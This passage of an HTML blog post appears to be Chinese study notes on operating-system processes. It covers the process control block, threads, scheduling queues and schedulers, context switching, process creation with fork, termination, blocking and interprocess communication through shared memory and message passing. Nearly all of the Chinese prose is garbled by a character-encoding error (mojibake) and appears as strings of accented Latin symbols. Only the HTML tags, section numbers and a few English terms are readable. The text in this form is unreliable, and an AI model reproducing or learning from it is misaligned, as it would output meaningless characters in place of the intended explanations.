å®ƒåŒ…å«è®¸å¤šä¸ä¸€ä¸ªç‰¹å®šè¿›ç¨‹ç›¸å…³çš„ä¿¡æ¯ã€‚</p><p><img src="/posts/8ce3e425/image-20211024144308211.png" alt="image-20211024144308211"></p><ul><li>è¿›ç¨‹çŠ¶æ€ï¼šçŠ¶æ€å¯åŒ…æ‹¬æ–°çš„ã€å°±ç»ªã€è¿è¡Œã€ç­‰å¾…ã€åœæ­¢ç­‰ã€‚</li><li>ç¨‹åºè®¡æ•°å™¨ï¼šè®¡æ•°å™¨è¡¨ç¤ºè¿›ç¨‹è¦æ‰§è¡Œçš„ä¸‹ä¸ªæŒ‡ä»¤çš„åœ°å€ã€‚</li><li>CPU å¯„å­˜å™¨ï¼šæ ¹æ®è®¡ç®—æœºä½“ç³»ç»“æ„çš„ä¸åŒï¼Œ å¯„å­˜å™¨çš„æ•°é‡å’Œç±»å‹ä¹Ÿä¸åŒã€‚å®ƒä»¬åŒ…æ‹¬ç´¯åŠ å™¨ã€ç´¢å¼•å¯„å­˜å™¨ã€å †é’±æŒ‡é’ˆã€é€šç”¨å¯„å­˜å™¨å’Œå…¶ä»–æ¡ä»¶ç ä¿¡æ¯å¯„å­˜å™¨ã€‚ä¸ç¨‹åºè®¡æ•°å™¨ä¸€èµ·ï¼Œè¿™äº›çŠ¶æ€ä¿¡æ¯åœ¨å‡ºç°ä¸­æ–­æ—¶ä¹Ÿéœ€è¦ä¿å­˜ï¼Œ ä»¥ä¾¿è¿›ç¨‹ä»¥åèƒ½æ­£ç¡®åœ°ç»§ç»­æ‰§è¡Œï¼ˆè§å›¾3.4)ã€‚</li><li>CPU è°ƒåº¦ä¿¡æ¯ï¼šè¿™ç±»ä¿¡æ¯åŒ…æ‹¬è¿›ç¨‹ä¼˜å…ˆçº§ã€è°ƒåº¦é˜Ÿåˆ—çš„æŒ‡é’ˆå’Œå…¶ä»–è°ƒåº¦å‚æ•°ï¼ˆç¬¬5ç« è®¨è®ºè¿›ç¨‹è°ƒåº¦ï¼‰ã€‚</li><li>å†…å­˜ç®¡ç†ä¿¡æ¯ï¼š æ ¹æ®æ“ä½œç³»ç»Ÿæ‰€ä½¿ç”¨çš„å†…å­˜ç³»ç»Ÿï¼Œ è¿™ç±»ä¿¡æ¯åŒ…æ‹¬åŸºå€å’Œç•Œé™å¯„å­˜å™¨çš„å€¼ã€é¡µè¡¨æˆ–æ®µè¡¨ï¼ˆè§ç¬¬8ç« ï¼‰ã€‚</li><li>è®°è´¦ä¿¡æ¯ï¼šè¿™ç±»ä¿¡æ¯åŒ…æ‹¬CPUæ—¶é—´ã€å®é™…ä½¿ç”¨æ—¶é—´ã€æ—¶é—´ç•Œé™ã€è®°è´¦æ•°æ®ã€ä½œä¸šæˆ–è¿›ç¨‹æ•°é‡ç­‰ã€‚</li><li>I/OçŠ¶æ€ä¿¡æ¯ï¼šè¿™ç±»ä¿¡æ¯åŒ…æ‹¬åˆ†é…ç»™è¿›ç¨‹çš„I/Oè®¾å¤‡åˆ—è¡¨ã€æ‰“å¼€çš„æ–‡ä»¶åˆ—è¡¨ç­‰ã€‚</li></ul><p><img src="/posts/8ce3e425/image-20211024144700188.png" alt="image-20211024144700188"></p><p><strong>PCBçš„ä½œç”¨</strong></p><ul><li>PCBå¯å”¯ä¸€æ ‡è¯†ä¸€ä¸ªè¿›ç¨‹</li><li>PCBä¸­çš„ä¿¡æ¯ä¸ºè¿›ç¨‹çš„æ§åˆ¶æä¾›ä¾æ®</li><li>PCBå°†ç¨‹åºå˜æˆäº†è¿›ç¨‹</li><li>PCBæ˜¯è¿›ç¨‹åœ¨ç³»ç»Ÿä¸­å­˜åœ¨çš„å”¯ä¸€æ ‡å¿—</li></ul><h3 id="314-çº¿ç¨‹"><a class="markdownIt-Anchor" href="#314-çº¿ç¨‹"></a> 3.1.4 çº¿ç¨‹</h3><p>è¿„ä»Šä¸ºæ­¢æ‰€è®¨è®ºçš„è¿›ç¨‹æ¨¡å‹æš—ç¤ºï¼š ä¸€ä¸ªè¿›ç¨‹æ˜¯ä¸€ä¸ªåªèƒ½è¿›è¡Œå•ä¸ªæ‰§è¡Œçº¿ç¨‹çš„ç¨‹åºã€‚ä¾‹å¦‚ï¼Œ å¦‚æœä¸€ä¸ªè¿›ç¨‹è¿è¡Œä¸€ä¸ªå­—å¤„ç†å™¨ç¨‹åºï¼Œ é‚£ä¹ˆåªèƒ½æ‰§è¡Œå•ä¸ªçº¿ç¨‹æŒ‡ä»¤ã€‚è¿™ç§å•ä¸€æ§åˆ¶çº¿ç¨‹ä½¿å¾—è¿›ç¨‹ä¸€æ¬¡åªèƒ½æ‰§è¡Œä¸€ä¸ªä»»åŠ¡ã€‚ä¾‹å¦‚ï¼Œ ç”¨æˆ·ä¸èƒ½åœ¨åŒä¸€è¿›ç¨‹å†…ï¼Œ åŒæ—¶è¾“å…¥å­—ç¬¦å’Œè¿›è¡Œæ‹¼å†™æ£€æŸ¥ã€‚</p><p>è®¸å¤šç°ä»£æ“ä½œç³»ç»Ÿæ‰©å±•äº†è¿›ç¨‹æ¦‚å¿µä»¥æ”¯æŒä¸€æ¬¡èƒ½æ‰§è¡Œå¤šä¸ªçº¿ç¨‹ã€‚ç¬¬4ç« å°†è®¨è®ºå¤šçº¿ç¨‹è¿›ç¨‹ã€‚</p><h2 id="32-è¿›ç¨‹è°ƒåº¦"><a class="markdownIt-Anchor" href="#32-è¿›ç¨‹è°ƒåº¦"></a> 3.2 è¿›ç¨‹è°ƒåº¦</h2><p>å¤šé“ç¨‹åºè®¾è®¡çš„ç›®çš„æ˜¯æ— è®ºä½•æ—¶éƒ½æœ‰è¿›ç¨‹åœ¨è¿è¡Œï¼Œä»è€Œä½¿CPUåˆ©ç”¨ç‡è¾¾åˆ°æœ€å¤§åŒ–ã€‚</p><p>åˆ†æ—¶ç³»ç»Ÿçš„ç›®çš„æ˜¯åœ¨è¿›ç¨‹ä¹‹é—´å¿«é€Ÿåˆ‡æ¢CPUä»¥ä¾¿ç”¨æˆ·åœ¨ç¨‹åºè¿è¡Œæ—¶èƒ½ä¸å…¶è¿›è¡Œäº¤äº’ã€‚</p><h3 id="321-è°ƒåº¦é˜Ÿåˆ—"><a class="markdownIt-Anchor" href="#321-è°ƒåº¦é˜Ÿåˆ—"></a> 3.2.1 è°ƒåº¦é˜Ÿåˆ—</h3><p>è®¨è®ºè¿›ç¨‹è°ƒåº¦çš„å¸¸ç”¨è¡¨ç¤ºæ–¹æ³•æ˜¯é˜Ÿåˆ—å›¾ï¼Œ å¦‚å›¾3.7 æ‰€ç¤ºã€‚æ¯ä¸ªé•¿æ–¹å½¢è¡¨ç¤ºä¸€ä¸ªé˜Ÿåˆ—ã€‚<br>æœ‰ä¸¤ç§é˜Ÿåˆ—ï¼š å°±ç»ªé˜Ÿåˆ—å’Œä¸€ç»„è®¾å¤‡é˜Ÿåˆ—ã€‚åœ†å½¢è¡¨ç¤ºä¸ºé˜Ÿåˆ—æœåŠ¡çš„èµ„æºï¼Œ ç®­å¤´è¡¨ç¤ºç³»ç»Ÿå†…è¿›ç¨‹çš„æµå‘ã€‚</p><p>æ–°è¿›ç¨‹å¼€å§‹å¤„äºå°±ç»ªé˜Ÿåˆ—ã€‚å®ƒåœ¨å°±ç»ªé˜Ÿåˆ—ä¸­ç­‰å¾…ç›´åˆ°è¢«é€‰ä¸­æ‰§è¡Œæˆ–è¢«æ´¾é£ã€‚å½“è¿›ç¨‹åˆ†é…åˆ°CPU å¹¶æ‰§è¡Œæ—¶ï¼Œ å¯èƒ½å‘ç”Ÿä¸‹é¢å‡ ç§äº‹ä»¶ä¸­çš„ä¸€ç§ï¼š</p><ul><li>è¿›ç¨‹å¯èƒ½å‘å‡ºä¸€ä¸ªI/Oè¯·æ±‚ï¼Œ å¹¶è¢«æ”¾åˆ°I/Oé˜Ÿåˆ—ä¸­ã€‚</li><li>è¿›ç¨‹å¯èƒ½åˆ›å»ºä¸€ä¸ªæ–°çš„å­è¿›ç¨‹ï¼Œ å¹¶ç­‰å¾…å…¶ç»“æŸã€‚</li><li>è¿›ç¨‹å¯èƒ½ä¼šç”±äºä¸­æ–­è€Œå¼ºåˆ¶é‡Šæ”¾CPUï¼Œ å¹¶è¢«æ”¾å›åˆ°å°±ç»ªé˜Ÿåˆ—ä¸­ã€‚</li></ul><p>å¯¹äºå‰ä¸¤ç§æƒ…å†µï¼Œ è¿›ç¨‹æœ€ç»ˆä»ç­‰å¾…çŠ¶æ€åˆ‡æ¢åˆ°å°±ç»ªæ€ï¼Œ å¹¶æ”¾å›åˆ°å°±ç»ªé˜Ÿåˆ—ä¸­ã€‚è¿›ç¨‹ç»§ç»­è¿™ä¸€å¾ªç¯ç›´åˆ°ç»ˆæ­¢ï¼Œ åˆ°æ—¶å®ƒå°†ä»æ‰€æœ‰é˜Ÿåˆ—ä¸­åˆ é™¤ï¼Œ å…¶PCB å’Œèµ„æºå°†å¾—ä»¥é‡Šæ”¾ã€‚</p><p><img src="/posts/8ce3e425/image-20211025195355812.png" alt="image-20211025195355812"></p><h3 id="322-è°ƒåº¦ç¨‹åº"><a class="markdownIt-Anchor" href="#322-è°ƒåº¦ç¨‹åº"></a> 3.2.2 è°ƒåº¦ç¨‹åº</h3><p>è¿›ç¨‹åœ¨å…¶ç”Ÿå‘½å‘¨æœŸä¸­ä¼šåœ¨å„ç§è°ƒåº¦é˜Ÿåˆ—ä¹‹é—´è¿ç§»ã€‚ä¸ºäº†è°ƒåº¦ï¼Œ æ“ä½œç³»ç»Ÿå¿…é¡»æŒ‰æŸç§æ–¹å¼ä»è¿™äº›é˜Ÿåˆ—ä¸­é€‰æ‹©è¿›ç¨‹ã€‚è¿›ç¨‹é€‰æ‹©æ˜¯ç”±ç›¸åº”çš„<strong>è°ƒåº¦ç¨‹åº</strong>ï¼ˆ scheduler ï¼‰æ¥æ‰§è¡Œçš„ã€‚</p><p>é€šå¸¸å¯¹äºæ‰¹å¤„ç†ç³»ç»Ÿï¼Œ è¿›ç¨‹æ›´å¤šåœ°æ˜¯è¢«æäº¤ï¼Œ è€Œä¸æ˜¯é©¬ä¸Šæ‰§è¡Œã€‚è¿™äº›è¿›ç¨‹è¢«æ”¾åˆ°å¤§å®¹é‡å­˜å‚¨è®¾å¤‡ï¼ˆé€šå¸¸ä¸ºç£ç›˜ã€‰çš„ç¼“å†²æ± ä¸­ï¼Œä¿å­˜åœ¨é‚£é‡Œä»¥ä¾¿ä»¥åæ‰§è¡Œã€‚</p><p><strong>é•¿æœŸè°ƒåº¦ç¨‹åº</strong>ï¼ˆlong-term scheduler ï¼‰æˆ–ä½œä¸šè°ƒåº¦ç¨‹åºï¼ˆjob scheduler ï¼‰ ä»ç¼“å†²æ± ä¸­é€‰æ‹©è¿›ç¨‹ï¼Œ å¹¶è£…å…¥å†…å­˜ä»¥å‡†å¤‡æ‰§è¡Œã€‚</p><p><strong>çŸ­æœŸè°ƒåº¦ç¨‹åº</strong>ï¼ˆ short-term scheduler ï¼‰æˆ–CPU è°ƒåº¦ç¨‹åºä»å‡†å¤‡æ‰§è¡Œçš„è¿›ç¨‹ä¸­é€‰æ‹©è¿›ç¨‹ï¼Œ å¹¶ä¸ºä¹‹åˆ†é…CPUã€‚</p><p>è¿™ä¸¤ä¸ªè°ƒåº¦ç¨‹åºçš„<strong>ä¸»è¦å·®åˆ«</strong>æ˜¯å®ƒä»¬æ‰§è¡Œçš„é¢‘ç‡ã€‚</p><p><strong>ä¸­æœŸè°ƒåº¦ç¨‹åº</strong>çš„æ ¸å¿ƒæ€æƒ³æ˜¯èƒ½å°†è¿›ç¨‹ä»å†…å­˜ï¼ˆæˆ–ä»CPU ç«äº‰ï¼‰ä¸­ç§»å‡ºï¼Œ ä»è€Œé™ä½å¤šé“ç¨‹åºè®¾è®¡çš„ç¨‹åº¦ã€‚ä¹‹åï¼Œ è¿›ç¨‹èƒ½è¢«é‡æ–°è°ƒå…¥å†…å­˜ï¼Œ å¹¶ä»ä¸­æ–­å¤„ç»§ç»­æ‰§è¡Œã€‚</p><p><img src="/posts/8ce3e425/image-20211025200346176.png" alt="image-20211025200346176"></p><h3 id="323-ä¸Šä¸‹æ–‡åˆ‡æ¢"><a class="markdownIt-Anchor" href="#323-ä¸Šä¸‹æ–‡åˆ‡æ¢"></a> 3.2.3 ä¸Šä¸‹æ–‡åˆ‡æ¢</h3><p>å½“å‘ç”Ÿä¸€ä¸ªä¸­æ–­æ—¶ï¼Œç³»ç»Ÿéœ€è¦ä¿å­˜å½“å‰è¿è¡Œåœ¨CPU ä¸­è¿›ç¨‹çš„ä¸Šä¸‹æ–‡ï¼Œ ä»è€Œåœ¨å…¶å¤„ç†å®Œåèƒ½æ¢å¤ä¸Šä¸‹æ–‡ï¼Œ å³å…ˆä¸­æ–­è¿›ç¨‹ï¼Œ ä¹‹åå†ç»§ç»­ã€‚</p><p><strong>è¿›ç¨‹ä¸Šä¸‹æ–‡</strong>ç”¨è¿›ç¨‹çš„PCB è¡¨ç¤ºï¼Œ å®ƒåŒ…æ‹¬CPU å¯„å­˜å™¨çš„å€¼ã€è¿›ç¨‹çŠ¶æ€ï¼ˆè§å›¾3.2ï¼‰ å’Œå†…å­˜ç®¡ç†ä¿¡æ¯ç­‰ã€‚é€šå¸¸ï¼Œé€šè¿‡æ‰§è¡Œä¸€ä¸ª<strong>çŠ¶æ€ä¿å­˜</strong>ï¼ˆ state saveï¼‰ æ¥ä¿å­˜CPUå½“å‰çŠ¶æ€ï¼ˆä¸ç®¡å®ƒæ˜¯å†…æ ¸æ¨¡å¼è¿˜æ˜¯ç”¨æˆ·æ¨¡å¼ï¼‰ï¼Œ ä¹‹åæ‰§è¡Œä¸€ä¸ª<strong>çŠ¶æ€æ¢å¤</strong>ï¼ˆ state restoreï¼‰é‡æ–°å¼€å§‹è¿è¡Œã€‚</p><p>å°†CPUåˆ‡æ¢åˆ°å¦ä¸€ä¸ªè¿›ç¨‹éœ€è¦ä¿å­˜å½“å‰è¿›ç¨‹çš„çŠ¶æ€å¹¶æ¢å¤å¦ä¸€ä¸ªè¿›ç¨‹çš„çŠ¶æ€ï¼Œè¿™ä¸€ä»»åŠ¡ç§°ä¸º<strong>ä¸Šä¸‹æ–‡åˆ‡æ¢</strong>ï¼ˆ context switchï¼‰ã€‚å½“å‘ç”Ÿä¸Šä¸‹æ–‡åˆ‡æ¢æ—¶ï¼Œ å†…æ ¸ä¼šå°†æ—§è¿›ç¨‹çš„çŠ¶æ€ä¿å­˜åœ¨å…¶PCBä¸­ï¼Œç„¶åè£…å…¥ç»è°ƒåº¦è¦æ‰§è¡Œçš„å¹¶å·±ä¿å­˜çš„æ–°è¿›ç¨‹çš„ä¸Šä¸‹æ–‡ã€‚</p><h2 id="33-è¿›ç¨‹æ“ä½œ"><a class="markdownIt-Anchor" href="#33-è¿›ç¨‹æ“ä½œ"></a> 3.3 è¿›ç¨‹æ“ä½œ</h2><h3 id="331-è¿›ç¨‹åˆ›å»º"><a class="markdownIt-Anchor" href="#331-è¿›ç¨‹åˆ›å»º"></a> 3.3.1 è¿›ç¨‹åˆ›å»º</h3><p>è¿›ç¨‹åœ¨å…¶æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œ èƒ½é€šè¿‡åˆ›å»ºè¿›ç¨‹ç³»ç»Ÿè°ƒç”¨ï¼ˆ create-process system callï¼‰ åˆ›å»ºå¤šä¸ªæ–°è¿›ç¨‹ã€‚åˆ›å»ºè¿›ç¨‹ç§°ä¸ºçˆ¶è¿›ç¨‹ï¼Œ è€Œæ–°è¿›ç¨‹ç§°ä¸ºå­è¿›ç¨‹ã€‚æ¯ä¸ªæ–°è¿›ç¨‹å¯ä»¥å†åˆ›å»ºå…¶ä»–è¿›ç¨‹ï¼Œä»è€Œå½¢æˆäº†è¿›ç¨‹æ ‘ã€‚</p><p><strong>åˆ›å»ºè¿‡ç¨‹</strong></p><ul><li><p>ç”³è¯·ç©ºç™½PCB</p></li><li><p>åˆ†é…èµ„æº</p></li><li><p>åˆå§‹åŒ–PCB</p></li><li><p>æ’å…¥å°±ç»ªé˜Ÿåˆ—</p></li></ul><p>è¿›ç¨‹åˆ›å»ºå®è´¨ä¸Šæ˜¯ç”Ÿæˆä¸€ä¸ªPCB</p><p><img src="/posts/8ce3e425/image-20211114152544023.png" alt="image-20211114152544023"></p><p>å½“è¿›ç¨‹åˆ›å»ºæ–°è¿›ç¨‹æ—¶ï¼Œ æœ‰ä¸¤ç§æ‰§è¡Œå¯èƒ½ï¼š<br>â‘ çˆ¶è¿›ç¨‹ä¸å­è¿›ç¨‹å¹¶å‘æ‰§è¡Œã€‚<br>â‘¡çˆ¶è¿›ç¨‹ç­‰å¾…ï¼Œ ç›´åˆ°æŸä¸ªæˆ–å…¨éƒ¨å­è¿›ç¨‹æ‰§è¡Œå®Œã€‚</p><p>æ–°è¿›ç¨‹çš„åœ°å€ç©ºé—´ä¹Ÿæœ‰ä¸¤ç§å¯èƒ½ï¼š<br>â‘ å­è¿›ç¨‹æ˜¯çˆ¶è¿›ç¨‹çš„å¤åˆ¶å“ï¼ˆå…·æœ‰ä¸çˆ¶è¿›ç¨‹ç›¸åŒçš„ç¨‹åºå’Œæ•°æ®ï¼‰ã€‚<br>â‘¡å­è¿›ç¨‹è£…å…¥å¦ä¸€ä¸ªæ–°ç¨‹åºã€‚</p><p><img src="/posts/8ce3e425/image-20211025201136927.png" alt="image-20211025201136927"></p><p><strong>forkå®ä¾‹ï¼š</strong></p><p><img src="/posts/8ce3e425/image-20220109122155530.png" alt="image-20220109122155530"></p><h3 id="332-è¿›ç¨‹ç»ˆæ­¢"><a class="markdownIt-Anchor" href="#332-è¿›ç¨‹ç»ˆæ­¢"></a> 3.3.2 è¿›ç¨‹ç»ˆæ­¢</h3><p><strong>è¿›ç¨‹ç»ˆæ­¢çš„è¿‡ç¨‹</strong></p><ul><li><p>æŸ¥æ‰¾è¿›ç¨‹</p></li><li><p>æŸ¥æ‰¾è¯¥è¿›ç¨‹çš„PCB</p></li><li><p>ä¸­æ­¢æ‰§è¡Œ</p></li><li><p>ç»ˆæ­¢å­è¿›ç¨‹</p></li><li><p>å½’è¿˜èµ„æº</p></li><li><p>å°†PCBä»æ‰€åœ¨é˜Ÿåˆ—ç§»å‡º</p></li><li><p>é‡Šæ”¾PCB</p></li></ul><p><img src="/posts/8ce3e425/image-20211114152857377.png" alt="image-20211114152857377"></p><p>å½“è¿›ç¨‹å®Œæˆæ‰§è¡Œæœ€åçš„è¯­å¥å¹¶ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨exit()è¯·æ±‚æ“ä½œç³»ç»Ÿåˆ é™¤è‡ªèº«æ—¶ï¼Œ è¿›ç¨‹ç»ˆæ­¢ã€‚è¿™æ—¶ï¼Œ è¿›ç¨‹å¯ä»¥è¿”å›çŠ¶æ€å€¼ï¼ˆé€šå¸¸ä¸ºæ•´æ•°ã€‰åˆ°çˆ¶è¿›ç¨‹ï¼ˆé€šè¿‡ç³»ç»Ÿè°ƒç”¨waitï¼ˆï¼‰ï¼‰ã€‚æ‰€æœ‰è¿›ç¨‹èµ„æºï¼ˆåŒ…æ‹¬ç‰©ç†å’Œè™šæ‹Ÿå†…å­˜ã€æ‰“å¼€æ–‡ä»¶å’ŒI/Oç¼“å†²ã€‰ä¼šè¢«æ“ä½œç³»ç»Ÿé‡Šæ”¾ã€‚</p><p>åœ¨å…¶ä»–æƒ…å†µä¸‹ä¹Ÿä¼šå‡ºç°ç»ˆæ­¢ã€‚è¿›ç¨‹é€šè¿‡é€‚å½“çš„ç³»ç»Ÿè°ƒç”¨ï¼ˆå¦‚Win32 ä¸­çš„TerminatePorcessï¼ˆï¼‰ï¼‰ èƒ½ç»ˆæ­¢å¦ä¸€ä¸ªè¿›ç¨‹ã€‚é€šå¸¸ï¼Œ åªæœ‰è¢«ç»ˆæ­¢è¿›ç¨‹çš„çˆ¶è¿›ç¨‹æ‰èƒ½æ‰§è¡Œè¿™ä¸€ç³»ç»Ÿè°ƒç”¨ã€‚å¦åˆ™ï¼Œ ç”¨æˆ·å¯ä»¥ä»»æ„åœ°ç»ˆæ­¢å½¼æ­¤çš„ä½œä¸šã€‚</p><h3 id="333-è¿›ç¨‹é˜»å¡"><a class="markdownIt-Anchor" href="#333-è¿›ç¨‹é˜»å¡"></a> 3.3.3 è¿›ç¨‹é˜»å¡</h3><p><strong>é˜»å¡è¿‡ç¨‹</strong></p><ul><li><p>åœæ­¢æ‰§è¡Œ</p></li><li><p>æ›´æ”¹PCBä¸ºé˜»å¡</p></li><li><p>ä¿ç•™ç°åœº</p></li><li><p>PCBæ’å…¥ç›¸åº”é˜»å¡é˜Ÿåˆ—</p></li><li><p>æç¤ºé‡æ–°è°ƒåº¦</p></li></ul><p><strong>å”¤é†’è¿‡ç¨‹</strong></p><ul><li>æ ¹æ®é‡Šæ”¾æ¡ä»¶å¯»æ‰¾ç›¸åº”è¿›ç¨‹</li><li>æ”¹PCBçŠ¶æ€ä¸ºå°±ç»ª</li><li>å°†PCBæ’å…¥å°±ç»ªé˜Ÿåˆ—</li></ul><h2 id="34-è¿›ç¨‹é—´é€šä¿¡"><a class="markdownIt-Anchor" href="#34-è¿›ç¨‹é—´é€šä¿¡"></a> 3.4 è¿›ç¨‹é—´é€šä¿¡</h2><p><strong>å…è®¸è¿›ç¨‹åä½œçš„ç†ç”±</strong></p><ul><li>ä¿¡æ¯å…±äº«ï¼ˆinformation sharingï¼‰ï¼šç”±äºå¤šä¸ªç”¨æˆ·å¯èƒ½å¯¹åŒæ ·çš„ä¿¡æ¯æ„Ÿå…´è¶£ï¼ˆä¾‹å¦‚å…±äº«çš„æ–‡ä»¶ï¼‰ï¼Œ æ‰€ä»¥å¿…é¡»æä¾›ç¯å¢ƒä»¥å…è®¸å¯¹è¿™äº›ä¿¡æ¯è¿›è¡Œå¹¶å‘è®¿é—®ã€‚</li><li>æé«˜è¿ç®—é€Ÿåº¦ï¼ˆcomputation speedupï¼‰ï¼š å¦‚æœå¸Œæœ›ä¸€ä¸ªç‰¹å®šä»»åŠ¡å¿«é€Ÿè¿è¡Œï¼Œ é‚£ä¹ˆå¿…é¡»å°†å®ƒåˆ†æˆå­ä»»åŠ¡ï¼Œæ¯ä¸ªå­ä»»åŠ¡å¯ä»¥ä¸å…¶ä»–å­ä»»åŠ¡å¹¶è¡Œæ‰§è¡Œã€‚æ³¨æ„ï¼Œå¦‚æœè¦å®ç°è¿™æ ·çš„åŠ é€Ÿï¼Œéœ€è¦è®¡ç®—æœºæœ‰å¤šä¸ªå¤„ç†å•å…ƒï¼ˆä¾‹å¦‚CPUæˆ–I/0é€šé“ï¼‰ã€‚</li><li>æ¨¡å—åŒ–ï¼ˆmodularityï¼‰ï¼šå¯èƒ½éœ€è¦æŒ‰æ¨¡å—åŒ–æ–¹å¼æ„é€ ç³»ç»Ÿï¼Œ å¦‚ç¬¬2ç« æ‰€è®¨è®ºï¼Œ å¯å°†ç³»ç»ŸåŠŸèƒ½åˆ†æˆç‹¬ç«‹è¿›ç¨‹æˆ–çº¿ç¨‹ã€‚</li><li>æ–¹ä¾¿ï¼ˆconvenienceï¼‰ï¼šå•ä¸ªç”¨æˆ·ä¹Ÿå¯èƒ½åŒæ—¶æ‰§è¡Œè®¸å¤šä»»åŠ¡ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ªç”¨æˆ·å¯ä»¥å¹¶è¡Œè¿›è¡Œç¼–è¾‘ã€æ‰“å°å’Œç¼–è¯‘æ“ä½œã€‚</li></ul><p>è¿›ç¨‹é—´é€šä¿¡æœ‰ä¸¤ç§åŸºæœ¬æ¨¡å¼ï¼š</p><p><strong>(1) å…±äº«å†…å­˜</strong></p><p>åœ¨å…±äº«å†…å­˜æ¨¡å¼ä¸­ï¼Œ å»ºç«‹èµ·ä¸€å—ä¾›åä½œè¿›ç¨‹å…±äº«çš„å†…å­˜åŒºåŸŸï¼Œ è¿›ç¨‹é€šè¿‡å‘æ­¤å…±äº«åŒºåŸŸè¯»æˆ–å†™å…¥æ•°æ®æ¥äº¤æ¢ä¿¡æ¯ã€‚</p><p><strong>(2) æ¶ˆæ¯ä¼ é€’</strong></p><p>åœ¨æ¶ˆæ¯ä¼ é€’æ¨¡å¼ä¸­ï¼Œé€šè¿‡åœ¨åä½œè¿›ç¨‹é—´äº¤æ¢æ¶ˆæ¯æ¥å®ç°é€šä¿¡ã€‚</p><p>å›¾3.13 ç»™å‡ºäº†è¿™ä¸¤ç§æ¨¡å¼çš„å¯¹æ¯”ã€‚</p><p><img src="/posts/8ce3e425/image-20211026154454752.png" alt="image-20211026154454752"></p><h3 id="341-å…±äº«å†…å­˜ç³»ç»Ÿ"><a class="markdownIt-Anchor" href="#341-å…±äº«å†…å­˜ç³»ç»Ÿ"></a> 3.4.1 å…±äº«å†…å­˜ç³»ç»Ÿ</h3><p>é‡‡ç”¨å…±äº«å†…å­˜çš„è¿›ç¨‹é—´é€šä¿¡éœ€è¦é€šä¿¡è¿›ç¨‹å»ºç«‹<strong>å…±äº«å†…å­˜åŒºåŸŸ</strong>ã€‚é€šå¸¸ï¼Œ ä¸€å—å…±äº«å†…å­˜åŒºåŸŸé©»ç•™åœ¨ç”Ÿæˆå…±äº«å†…å­˜æ®µè¿›ç¨‹çš„åœ°å€ç©ºé—´ã€‚å…¶ä»–å¸Œæœ›ä½¿ç”¨è¿™ä¸ªå…±äº«å†…å­˜æ®µè¿›è¡Œé€šä¿¡çš„è¿›ç¨‹å¿…é¡»å°†æ­¤æ”¾åˆ°å®ƒä»¬è‡ªå·±çš„åœ°å€ç©ºé—´ä¸Šã€‚</p><p>é‡‡ç”¨å…±äº«å†…å­˜æ˜¯è§£å†³ç”Ÿäº§è€…ä¸€æ¶ˆè´¹è€…é—®é¢˜æ–¹æ³•ä¸­çš„ä¸€ç§ã€‚ä¸ºäº†å…è®¸ç”Ÿäº§è€…è¿›ç¨‹å’Œæ¶ˆè´¹è¿›ç¨‹èƒ½å¹¶å‘æ‰§è¡Œï¼Œ å¿…é¡»è¦æœ‰ä¸€ä¸ªç¼“å†²æ¥è¢«ç”Ÿäº§è€…å¡«å……å¹¶è¢«æ¶ˆè´¹è€…æ‰€ä½¿ç”¨ã€‚æ­¤ç¼“å†²é©»ç•™åœ¨ç”Ÿäº§è€…è¿›ç¨‹å’Œæ¶ˆè´¹è€…è¿›ç¨‹çš„å…±äº«å†…å­˜åŒºåŸŸå†…ï¼Œ å½“æ¶ˆè´¹è€…ä½¿ç”¨ä¸€é¡¹æ—¶ï¼Œ ç”Ÿäº§è€…èƒ½äº§ç”Ÿå¦ä¸€é¡¹ã€‚ç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…å¿…é¡»åŒæ­¥ï¼Œ ä»¥å…æ¶ˆè´¹è€…æ¶ˆè´¹ä¸€ä¸ªæ²¡æœ‰ç”Ÿäº§å‡ºæ¥çš„é¡¹ã€‚</p><p>å¯ä»¥ä½¿ç”¨ä¸¤ç§ç¼“å†²ã€‚<strong>æ— é™ç¼“å†²</strong>ï¼ˆunbounded-bufferï¼‰å¯¹ç¼“å†²å¤§å°æ²¡æœ‰é™åˆ¶ã€‚æ¶ˆè´¹è€…å¯èƒ½ä¸å¾—ä¸ç­‰å¾…æ–°çš„é¡¹ï¼Œ ä½†ç”Ÿäº§è€…æ€»æ˜¯å¯ä»¥äº§ç”Ÿæ–°é¡¹ã€‚æœ‰é™ç¼“å†²ï¼ˆ bounded-bufferï¼‰å‡è®¾ç¼“å†²å¤§å°å›ºå®šã€‚å¯¹äºè¿™ç§æƒ…å†µï¼Œ å¦‚æœç¼“å†²ä¸ºç©ºï¼Œ é‚£ä¹ˆæ¶ˆè´¹è€…å¿…é¡»ç­‰å¾…ï¼šå¦‚æœç¼“å†²ä¸ºæ»¡ï¼Œ é‚£ä¹ˆç”Ÿäº§è€…å¿…é¡»ç­‰å¾…ã€‚</p><p>å…±äº«ç¼“å†²æ˜¯é€šè¿‡å¾ªç¯æ•°ç»„å’Œä¸¤ä¸ªé€»è¾‘æŒ‡é’ˆæ¥å®ç°çš„ï¼š in å’Œoutã€‚å˜é‡in æŒ‡å‘ç¼“å†²ä¸­ä¸‹ä¸€ä¸ªç©ºä½ï¼š out æŒ‡å‘ç¼“å†²ä¸­çš„ç¬¬ä¸€ä¸ªæ»¡ä½ã€‚å½“in==out æ—¶ï¼Œ ç¼“å†²ä¸ºç©ºï¼š (in+1)%BUFFER_SIZE= out æ—¶ï¼Œç¼“å†²ä¸ºæ»¡ã€‚</p><p><img src="/posts/8ce3e425/image-20211026155644352.png" alt="image-20211026155644352"></p><h3 id="342-æ¶ˆæ¯ä¼ é€’ç³»ç»Ÿ"><a class="markdownIt-Anchor" href="#342-æ¶ˆæ¯ä¼ é€’ç³»ç»Ÿ"></a> 3.4.2 æ¶ˆæ¯ä¼ é€’ç³»ç»Ÿ</h3><p>æ¶ˆæ¯ä¼ é€’æä¾›ä¸€ç§æœºåˆ¶ä»¥å…è®¸è¿›ç¨‹ä¸å¿…é€šè¿‡å…±äº«åœ°å€ç©ºé—´æ¥å®ç°é€šä¿¡å’ŒåŒæ­¥ã€‚</p><p>æ¶ˆæ¯ä¼ é€’å·¥å…·æä¾›è‡³å°‘ä¸¤ç§æ“ä½œï¼šå‘é€ï¼ˆæ¶ˆæ¯ï¼‰ å’Œæ¥æ”¶ï¼ˆæ¶ˆæ¯ï¼‰ ã€‚</p><ol><li><p><strong>å‘½å</strong></p><p><strong>ç›´æ¥é€šä¿¡</strong>:</p><p>å¯¹äº<strong>ç›´æ¥é€šä¿¡</strong>ï¼Œ 